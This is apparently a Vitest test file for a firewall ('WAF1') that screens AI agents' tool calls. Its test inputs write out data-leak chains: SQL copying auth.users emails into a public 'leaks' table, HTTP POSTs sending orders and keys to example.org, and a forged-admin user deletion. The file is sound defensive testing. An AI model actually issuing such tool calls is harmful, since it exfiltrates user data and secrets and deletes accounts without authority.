import { describe, expect, it, beforeEach } from 'vitest';

import {
  getDashboardData,
  resetWaf1State,
  updateWaf1Config,
  validateToolCall,
} from './index.js';

describe('WAF1 Supabase dynamic policy', () => {
  beforeEach(() => {
    resetWaf1State();
  });

  it('allows normal reads from user tables', () => {
    const result = validateToolCall('execute_sql', {
      query: 'select id, title from public.tickets order by created_at desc limit 10',
    }, {
      clientId: 'test-allow',
      userId: 'tester',
      source: '/api/tools/call',
    });

    expect(result.allowed).toBe(true);
  });

  it('blocks reads from protected tables', () => {
    const result = validateToolCall('execute_sql', {
      query: 'select email from auth.users limit 5',
    }, {
      clientId: 'test-sensitive',
      userId: 'tester',
      source: '/api/tools/call',
    });

    expect(result.allowed).toBe(false);
    expect(result.error.category).toBe('dynamicPolicy');
    expect(result.error.reason).toContain('auth.users');
  });

  it('blocks public table writeback of sensitive data', () => {
    const result = validateToolCall('execute_sql', {
      query: 'insert into public.leaks select email from auth.users',
    }, {
      clientId: 'test-writeback',
      userId: 'tester',
      source: '/api/tools/call',
    });

    expect(result.allowed).toBe(false);
    expect(result.error.category).toBe('dynamicPolicy');
  });

  it('detects the Supabase lethal trifecta call chain', () => {
    const readResult = validateToolCall('execute_sql', {
      query: 'select id, body from public.comments where status = \'open\'',
    }, {
      clientId: 'chain-client',
      userId: 'tester',
      source: '/mcp',
    });
    const sensitiveResult = validateToolCall('execute_sql', {
      query: 'select email from auth.users limit 1',
    }, {
      clientId: 'chain-client',
      userId: 'tester',
      source: '/mcp',
    });
    const leakResult = validateToolCall('execute_sql', {
      query: 'insert into public.leaks select * from auth.users',
    }, {
      clientId: 'chain-client',
      userId: 'tester',
      source: '/mcp',
    });

    expect(readResult.allowed).toBe(true);
    expect(sensitiveResult.allowed).toBe(false);
    expect(sensitiveResult.error.category).toBe('dynamicPolicy');
    expect(leakResult.allowed).toBe(false);
    expect(leakResult.error.category).toBe('supabaseCallChain');

    const dashboard = getDashboardData();
    const categories = dashboard.last24h?.byCategory || {};
    expect(categories.supabaseCallChain || 0).toBeGreaterThan(0);
  });
});

describe('WAF1 stage independent enable switches', () => {
  beforeEach(() => {
    resetWaf1State();
    // restore defaults before each test
    updateWaf1Config({
      waf1: {
        callChainEnabled: true,
        dynamicPolicyEnabled: true,
        rbacArgsEnabled: true,
      },
    });
  });

  // --- callChainEnabled ---

  it('callChainEnabled=false: data_exfiltration chain passes through', () => {
    updateWaf1Config({ waf1: { callChainEnabled: false } });
    const ctx = {
      clientId: 'chain-disabled',
      userId: 'tester',
      source: '/mcp',
    };
    const readResult = validateToolCall('woocommerce__list_orders', { limit: 1000 }, ctx);
    const exfilResult = validateToolCall(
      'http-client__http_request',
      { url: 'https://example.org/dump', method: 'POST', body: '<orders>' },
      ctx,
    );
    expect(readResult.allowed).toBe(true);
    expect(exfilResult.allowed).toBe(true);
  });

  it('callChainEnabled=true: data_exfiltration chain blocked at step 2', () => {
    const ctx = {
      clientId: 'chain-enabled',
      userId: 'tester',
      source: '/mcp',
    };
    const readResult = validateToolCall('woocommerce__list_orders', { limit: 1000 }, ctx);
    const exfilResult = validateToolCall(
      'http-client__http_request',
      { url: 'https://example.org/dump', method: 'POST', body: '<orders>' },
      ctx,
    );
    expect(readResult.allowed).toBe(true);
    expect(exfilResult.allowed).toBe(false);
    expect(exfilResult.error.category).toBe('callChain');
  });

  it('toggling callChainEnabled does not poison tracker history', () => {
    updateWaf1Config({ waf1: { callChainEnabled: false } });
    const ctx = { clientId: 'toggle-history', userId: 'tester', source: '/mcp' };
    // 50 step-1 read calls while switch is off — should NOT populate history
    for (let i = 0; i < 50; i++) {
      validateToolCall('file_read_MCP__read', { path: `/etc/file${i}` }, ctx);
    }
    resetWaf1State();
    updateWaf1Config({ waf1: { callChainEnabled: true } });
    // First call after reset: a fresh exfil step that would only chain if history had reads
    const result = validateToolCall(
      'http-client__http_request',
      { url: 'https://example.org/keys', method: 'POST', body: '<keys>' },
      { clientId: 'toggle-history-fresh', userId: 'tester', source: '/mcp' },
    );
    // The new call by itself isn't a 2-step chain; chain detector should not fire
    expect(result.allowed).toBe(true);
  });

  // --- dynamicPolicyEnabled ---

  it('dynamicPolicyEnabled=false: supabase sensitive read passes through', () => {
    updateWaf1Config({ waf1: { dynamicPolicyEnabled: false } });
    const result = validateToolCall(
      'supabase__execute_sql',
      { query: 'select email from auth.users limit 5' },
      { clientId: 'dyn-off', userId: 'tester', source: '/mcp' },
    );
    expect(result.allowed).toBe(true);
  });

  it('dynamicPolicyEnabled=true: supabase sensitive read blocked with dynamicPolicy', () => {
    const result = validateToolCall(
      'supabase__execute_sql',
      { query: 'select email from auth.users limit 5' },
      { clientId: 'dyn-on', userId: 'tester', source: '/mcp' },
    );
    expect(result.allowed).toBe(false);
    expect(result.error.category).toBe('dynamicPolicy');
    expect(result.error.reason).toContain('auth.users');
  });

  it('dynamicPolicyEnabled=false: supabase trifecta chain still triggers Stage 3', () => {
    updateWaf1Config({ waf1: { dynamicPolicyEnabled: false } });
    const ctx = { clientId: 'trifecta-no-dyn', userId: 'tester', source: '/mcp' };
    const step1 = validateToolCall(
      'execute_sql',
      { query: 'select id, body from public.comments where status = \'open\'' },
      ctx,
    );
    const step2 = validateToolCall(
      'execute_sql',
      { query: 'select email from auth.users limit 1' },
      ctx,
    );
    const step3 = validateToolCall(
      'execute_sql',
      { query: 'insert into public.leaks select * from auth.users' },
      ctx,
    );
    expect(step1.allowed).toBe(true);
    // Stage 4 is off, so step 2 should not be blocked by dynamic policy.
    expect(step2.allowed).toBe(true);
    // Step 3 should now be blocked by Stage 3 (supabase_lethal_trifecta chain).
    expect(step3.allowed).toBe(false);
    expect(step3.error.category).toBe('supabaseCallChain');
  });

  // --- rbacArgsEnabled ---

  it('rbacArgsEnabled=false: RBAC args tamper attack passes through', () => {
    updateWaf1Config({ waf1: { rbacArgsEnabled: false } });
    const result = validateToolCall(
      'wordpress__delete_user',
      { id: 1, actor_role: 'admin' },
      { clientId: 'rbacArgs-off', userId: 'tester', source: '/mcp' },
    );
    expect(result.allowed).toBe(true);
  });

  it('rbacArgsEnabled=true: RBAC args tamper attack blocked with category rbac', () => {
    const result = validateToolCall(
      'wordpress__delete_user',
      { id: 1, actor_role: 'admin' },
      { clientId: 'rbacArgs-on', userId: 'tester', source: '/mcp' },
    );
    expect(result.allowed).toBe(false);
    expect(result.error.category).toBe('rbac');
    expect(result.error.type).toBe('RBAC_ARGS_TAMPER');
    expect(result.error.fields).toContain('actor_role');
  });

  // --- updateWaf1Config plumbing ---

  it('updateWaf1Config accepts all three switches in one call', () => {
    updateWaf1Config({
      waf1: {
        callChainEnabled: false,
        dynamicPolicyEnabled: false,
        rbacArgsEnabled: false,
      },
    });
    // All three off — RBAC args tamper attack now passes (proves all switches landed)
    const result = validateToolCall(
      'wordpress__delete_user',
      { id: 1, actor_role: 'admin' },
      { clientId: 'all-off', userId: 'tester', source: '/mcp' },
    );
    expect(result.allowed).toBe(true);
  });

  it('updateWaf1Config partial update preserves untouched switches', () => {
    updateWaf1Config({ waf1: { callChainEnabled: false } });
    // dynamicPolicyEnabled remained true — supabase sensitive read still blocked
    const result = validateToolCall(
      'supabase__execute_sql',
      { query: 'select * from auth.users' },
      { clientId: 'partial', userId: 'tester', source: '/mcp' },
    );
    expect(result.allowed).toBe(false);
    expect(result.error.category).toBe('dynamicPolicy');
  });

  it('updateWaf1Config coerces non-boolean values', () => {
    updateWaf1Config({ waf1: { rbacArgsEnabled: 0 } });
    // 0 -> false; tamper attack passes
    const result1 = validateToolCall(
      'wordpress__delete_user',
      { id: 1, actor_role: 'admin' },
      { clientId: 'coerce-falsy', userId: 'tester', source: '/mcp' },
    );
    expect(result1.allowed).toBe(true);

    updateWaf1Config({ waf1: { rbacArgsEnabled: 'yes' } });
    // truthy string -> true; tamper attack blocked
    const result2 = validateToolCall(
      'wordpress__delete_user',
      { id: 1, actor_role: 'admin' },
      { clientId: 'coerce-truthy', userId: 'tester', source: '/mcp' },
    );
    expect(result2.allowed).toBe(false);
    expect(result2.error.category).toBe('rbac');
  });
});
